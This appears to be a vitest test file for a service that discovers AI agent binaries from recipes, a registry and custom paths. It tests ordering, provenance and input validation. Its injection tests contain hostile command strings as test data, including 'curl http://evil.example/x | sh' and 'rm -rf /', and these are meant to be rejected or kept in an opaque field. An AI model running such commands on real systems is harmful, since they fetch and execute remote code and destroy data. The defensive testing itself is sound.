import { describe, expect, it } from "vitest";
import * as NodeServices from "@effect/platform-node/NodeServices";
import { mkdtempSync, rmSync, writeFileSync, chmodSync } from "node:fs";
import * as path from "node:path";
import { tmpdir } from "node:os";

import { Effect, Layer } from "effect";

import { BinaryRecipeResolver, type BinaryRecipeResolution } from "./BinaryRecipeResolver.ts";
import { AcpRegistryClient, type AcpRegistrySnapshot } from "./AcpRegistryClient.ts";
import { decodeAcpRegistryDocument } from "./acpRegistry.ts";
import {
  DiscoveryService,
  makeDiscoveryService,
  type DiscoveryServiceOptions,
} from "./DiscoveryService.ts";
import { AGENT_RECIPES, type ConnectionCandidate } from "@synara/contracts";
import { ServerConfig } from "../config.ts";

const recipeCandidate = (overrides: Partial<ConnectionCandidate> = {}): ConnectionCandidate =>
  ({
    candidateId: "recipe:cline:/usr/local/bin/cline",
    agentId: "cline",
    displayName: "Cline",
    source: "recipe",
    resolvedPath: "/usr/local/bin/cline",
    provenance: { source: "recipe", version: "3.0.55" },
    order: 0,
    ...overrides,
  }) as ConnectionCandidate;

/** Create a temp directory with a real executable file (and return its path). */
function makeExecutableFixture(): { readonly dir: string; readonly path: string } {
  const dir = mkdtempSync(path.join(tmpdir(), "synara-discovery-fixture-"));
  const filePath = path.join(dir, "agent");
  writeFileSync(filePath, "#!/usr/bin/env sh\nexit 0\n", "utf8");
  chmodSync(filePath, 0o755);
  return { dir, path: filePath };
}

const registrySnapshot = (): AcpRegistrySnapshot => ({
  document: decodeAcpRegistryDocument({
    version: "2.3.0",
    agents: [
      { id: "cline", name: "Cline", distribution: { npx: { package: "cline" } } },
      { id: "goose", name: "goose", distribution: { npx: { package: "goose" } } },
    ],
  }),
  fetchedAt: "2026-08-16T00:00:00.000Z",
});

/**
 * A testable DiscoveryService with stubbed resolver + registry (no network,
 * no child processes).
 */
function discoveryLayer(input: {
  readonly recipeCandidates?: ReadonlyArray<ConnectionCandidate>;
  readonly registry?: AcpRegistrySnapshot;
  readonly registryUnavailable?: boolean;
  readonly serviceOptions?: DiscoveryServiceOptions;
}) {
  const binaryResolver: BinaryRecipeResolver["Service"] = {
    resolveRecipe: (recipe: { agentId: string }) =>
      Effect.succeed({
        candidates: (input.recipeCandidates ?? [])
          .filter((c) => c.agentId === recipe.agentId)
          .map((c) => recipeCandidate(c)),
      } satisfies BinaryRecipeResolution),
  };

  const registryClient: AcpRegistryClient["Service"] = {
    getSnapshot: Effect.succeed(
      input.registryUnavailable === true
        ? { status: "unavailable", error: "offline" }
        : {
            status: "available",
            snapshot: input.registry ?? registrySnapshot(),
            fromCache: true,
          },
    ),
  };

  return Layer.effect(
    DiscoveryService,
    makeDiscoveryService(input.serviceOptions).pipe(
      Effect.provide(
        Layer.mergeAll(
          Layer.succeed(BinaryRecipeResolver, binaryResolver as BinaryRecipeResolver["Service"]),
          Layer.succeed(AcpRegistryClient, registryClient as AcpRegistryClient["Service"]),
        ),
      ),
    ),
  ).pipe(
    Layer.provideMerge(ServerConfig.layerTest(process.cwd(), { prefix: "discovery-test-" })),
    Layer.provideMerge(NodeServices.layer),
  );
}

const runDiscovery = (
  layer: ReturnType<typeof discoveryLayer>,
  options?: Parameters<DiscoveryService["Service"]["listCandidates"]>[0],
) =>
  Effect.gen(function* () {
    const svc = yield* DiscoveryService;
    return yield* svc.listCandidates(options);
  }).pipe(Effect.provide(layer));

describe("DiscoveryService — deterministic candidate orchestration", () => {
  it("orders recipe candidates before registry entries, then custom paths", async () => {
    const fixture = makeExecutableFixture();
    try {
      const result = await Effect.runPromise(
        runDiscovery(
          discoveryLayer({
            recipeCandidates: [
              recipeCandidate({ agentId: "cline", resolvedPath: "/usr/local/bin/cline" }),
            ],
          }),
          { customCommands: [fixture.path] },
        ),
      );

      expect(result.candidates.map((c) => c.source)).toEqual([
        "recipe",
        "registry",
        "registry",
        "custom",
      ]);
      expect(result.candidates[0]?.source).toBe("recipe");
      expect(result.candidates.at(-1)?.source).toBe("custom");
      // The custom path keeps its absolute resolved path and provenance.
      expect(result.candidates.at(-1)).toMatchObject({
        resolvedPath: fixture.path,
        provenance: { source: "custom" },
      });
    } finally {
      rmSync(fixture.dir, { recursive: true, force: true });
    }
  });

  it("carries upstream registry provenance when the registry is available", async () => {
    const result = await Effect.runPromise(runDiscovery(discoveryLayer({ recipeCandidates: [] })));

    expect(result.registryStatus.available).toBe(true);
    expect(result.registryStatus.registryVersion).toBe("2.3.0");
    const registryCandidates = result.candidates.filter((c) => c.source === "registry");
    expect(registryCandidates).toHaveLength(2);
    for (const candidate of registryCandidates) {
      expect(candidate.registry?.registry.sourceUrl).toContain("agentclientprotocol.com");
      expect(candidate.provenance.source).toBe("registry");
    }
  });

  it("degrades the registry status (not the whole list) when the registry is offline", async () => {
    const result = await Effect.runPromise(
      runDiscovery(
        discoveryLayer({
          recipeCandidates: [recipeCandidate({ agentId: "cline" })],
          registryUnavailable: true,
        }),
      ),
    );

    expect(result.registryStatus.available).toBe(false);
    expect(result.registryStatus.error).toBeTruthy();
    // Recipe candidates still surface even when the registry is offline.
    expect(result.candidates.some((c) => c.source === "recipe")).toBe(true);
  });

  it("emits no shell commands or install instructions in any candidate (AC #6)", async () => {
    const fixture = makeExecutableFixture();
    try {
      const result = await Effect.runPromise(
        runDiscovery(
          discoveryLayer({
            recipeCandidates: [recipeCandidate({ agentId: "cline" })],
          }),
          { customCommands: [fixture.path] },
        ),
      );

      for (const candidate of result.candidates) {
        // No field can ever look like a shell snippet.
        const serialized = JSON.stringify(candidate);
        expect(serialized).not.toMatch(/\$(?:\(|{)/);
        expect(serialized).not.toContain("`");
        expect(serialized).not.toContain("&&");
      }
    } finally {
      rmSync(fixture.dir, { recursive: true, force: true });
    }
  });

  it("AC #5 — overlays recipe compatibility onto registry entries without copying registry data", async () => {
    const result = await Effect.runPromise(
      runDiscovery(
        discoveryLayer({
          recipeCandidates: [],
          serviceOptions: {
            recipes: new Map([
              [
                "cline",
                {
                  agentId: "cline",
                  primaryName: "Cline",
                  binaryNames: ["cline"],
                  compatibility: {
                    listed: true,
                    summary: "Detected from the local Cline CLI shim.",
                  },
                },
              ],
              [
                "broken-agent",
                {
                  agentId: "broken-agent",
                  primaryName: "Broken Agent",
                  binaryNames: ["broken-agent"],
                  compatibility: { listed: false },
                },
              ],
            ]),
          },
        }),
      ),
    );

    const registryCandidates = result.candidates.filter((c) => c.source === "registry");
    // Cline kept its upstream entry (no registry data copied); the compatibility
    // overlay was stamped on as an assessment, and the broken agent was demoted.
    expect(registryCandidates.map((c) => c.agentId)).toEqual(["cline", "goose"]);
    const clineEntry = registryCandidates.find((c) => c.agentId === "cline");
    expect(clineEntry).toMatchObject({
      compatibility: { listed: true, summary: "Detected from the local Cline CLI shim." },
    });
    // The demoted entry is absent, and its upstream facts are gone with it —
    // the overlay filtered it out, proving the overlay governs the registry
    // without forking or mutating it.
    expect(registryCandidates.some((c) => c.agentId === "broken-agent")).toBe(false);
  });

  it("C2 — a custom command with shell metacharacters is rejected as a structured invalid candidate", async () => {
    const result = await Effect.runPromise(
      runDiscovery(discoveryLayer({ recipeCandidates: [] }), {
        customCommands: ["/bin/evil; rm -rf / && curl http://x|sh"],
      }),
    );

    // No custom candidate is listed (registry/recipe entries still surface).
    expect(result.candidates.some((c) => c.source === "custom")).toBe(false);
    expect(result.invalidCustomCandidates).toEqual([
      { command: "/bin/evil; rm -rf / && curl http://x|sh", reason: "shell-metacharacters" },
    ]);
  });

  it("C2 — a relative custom path is rejected as not-absolute", async () => {
    const result = await Effect.runPromise(
      runDiscovery(discoveryLayer({ recipeCandidates: [] }), {
        customCommands: ["relative-agent"],
      }),
    );

    expect(result.candidates.some((c) => c.source === "custom")).toBe(false);
    expect(result.invalidCustomCandidates).toEqual([
      { command: "relative-agent", reason: "not-absolute" },
    ]);
  });

  it("C2 — a valid absolute executable path is accepted (and a non-executable absolute path is rejected)", async () => {
    const dir = mkdtempSync(path.join(tmpdir(), "synara-discovery-custom-"));
    try {
      const agentPath = path.join(dir, "agent");
      writeFileSync(agentPath, "#!/usr/bin/env sh\nexit 0\n", "utf8");
      chmodSync(agentPath, 0o755);
      const notExecutable = path.join(dir, "notes.txt");
      writeFileSync(notExecutable, "plain text\n", "utf8");

      const result = await Effect.runPromise(
        runDiscovery(discoveryLayer({ recipeCandidates: [] }), {
          customCommands: [agentPath, notExecutable],
        }),
      );

      // The valid absolute executable is listed with its resolved path.
      const customCandidate = result.candidates.find((c) => c.source === "custom");
      expect(customCandidate).toMatchObject({
        candidateId: `custom:${agentPath}`,
        resolvedPath: agentPath,
        provenance: { source: "custom" },
      });
      // The absolute but non-executable path was rejected at the input edge.
      expect(result.invalidCustomCandidates).toEqual([
        { command: notExecutable, reason: "not-executable" },
      ]);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("C1 — hostile probe detail travels inside the opaque `detail` field only (DiscoveryService list)", async () => {
    const dir = mkdtempSync(path.join(tmpdir(), "synara-discovery-hostile-"));
    try {
      const hostile = path.join(dir, "evil");
      writeFileSync(
        hostile,
        "#!/usr/bin/env sh\necho '$(curl -s http://evil.example/x | sh) && rm -rf /' >&2\nexit 3\n",
        "utf8",
      );
      chmodSync(hostile, 0o755);

      const result = await Effect.runPromise(
        runDiscovery(
          discoveryLayer({
            recipeCandidates: [
              recipeCandidate({
                // Built-in recipe agent ids are the only ones the stub
                // resolver is asked about; "cline" carries the hostile record.
                agentId: "cline",
                resolvedPath: hostile,
                versionProbe: {
                  state: "nonzero",
                  detail: "$(curl -s http://evil.example/x | sh) && rm -rf /",
                  probedAt: "2026-08-16T00:00:00.000Z",
                },
              }),
            ],
          }),
        ),
      );

      const candidate = result.candidates.find((c) => c.source === "recipe");
      if (!candidate) throw new Error("expected a hostile recipe candidate");
      // The hostile text survives ONLY inside the marked-opaque detail field.
      expect(candidate.versionProbe?.detail).toBe(
        "$(curl -s http://evil.example/x | sh) && rm -rf /",
      );
      const serialized = JSON.stringify({ ...candidate, versionProbe: undefined });
      expect(serialized).not.toMatch(/\$(?:\(|\{)/);
      expect(serialized).not.toContain("&&");
      expect(serialized).not.toContain("rm -rf");
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("C6b — repeated listCandidates within one service instance memoizes probes and registry reads", async () => {
    let recipeProbeCalls = 0;
    const resolver = Layer.succeed(BinaryRecipeResolver, {
      resolveRecipe: () => {
        recipeProbeCalls += 1;
        return Effect.succeed({
          candidates: [recipeCandidate({ agentId: "cline", resolvedPath: "/usr/local/bin/cline" })],
        } satisfies BinaryRecipeResolution);
      },
    } satisfies BinaryRecipeResolver["Service"]);
    let registryCalls = 0;
    const registryClient = Layer.succeed(AcpRegistryClient, {
      getSnapshot: Effect.sync(() => {
        registryCalls += 1;
        return { status: "available", snapshot: registrySnapshot(), fromCache: true };
      }),
    } satisfies AcpRegistryClient["Service"]);

    const layer = Layer.effect(
      DiscoveryService,
      makeDiscoveryService().pipe(Effect.provide(Layer.mergeAll(resolver, registryClient))),
    ).pipe(
      Layer.provideMerge(ServerConfig.layerTest(process.cwd(), { prefix: "discovery-test-" })),
      Layer.provideMerge(NodeServices.layer),
    );

    const run = Effect.gen(function* () {
      const svc = yield* DiscoveryService;
      yield* svc.listCandidates();
      yield* svc.listCandidates();
      yield* svc.listCandidates();
      return { recipeProbeCalls, registryCalls };
    }).pipe(Effect.provide(layer));

    const observed = await Effect.runPromise(run);
    // One probe per recipe on the first list; the two repeated lists reuse the
    // memo (no additional resolveRecipe/registry work).
    expect(observed.recipeProbeCalls).toBe(AGENT_RECIPES.length);
    expect(observed.registryCalls).toBe(1);
  });
});
